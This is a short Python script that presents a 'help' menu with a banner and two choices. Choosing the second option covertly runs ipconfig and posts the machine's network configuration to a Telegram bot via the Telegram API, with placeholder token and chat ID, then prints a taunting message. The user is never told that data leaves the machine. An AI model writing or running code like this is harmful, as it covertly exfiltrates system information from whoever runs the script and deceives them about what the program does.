import pyfiglet
import colorama
import subprocess
import requests
import webbrowser

print(colorama.Fore.RED + "")
print(pyfiglet.figlet_format("help", font = "big"))
print(colorama.Fore.WHITE + "")

def menu():
    print("[1] Let me help you")
    print("[2] Fuck off")
menu()

while True:
    try:
        option = int(input(">>>> "))
        if option == 1:
            url = 'https://github.com/MoonHF'
            webbrowser.open_new_tab(url)
            print("here we go")
            break
        elif option == 2:
            Token = "YOUR_BOT_TOKEN"
            CHAT_ID = "YOUR_CHAT_ID"

            def send_ipconfig_to_telegram():
                try:
                    result = subprocess.run(["ipconfig"], capture_output=True, text=True)
                    ipconfig_output = result.stdout

                    telegram_api_url = f"https://api.telegram.org/bot{Token}/sendMessage"

                    response = requests.post(telegram_api_url, data={
                        "chat_id": CHAT_ID,
                        "text": ipconfig_output
                    })

                    if response.status_code == 200:
                        print("hehehe")
                    else:
                        print(f"whoops: {response.status_code}, {response.text}")

                except Exception as e:
                    print(f"ops: {e}")

            send_ipconfig_to_telegram()
            break
        else:
            print("silly , chose 1 or 2")
    except ValueError:
        print("Something wrong here young man")
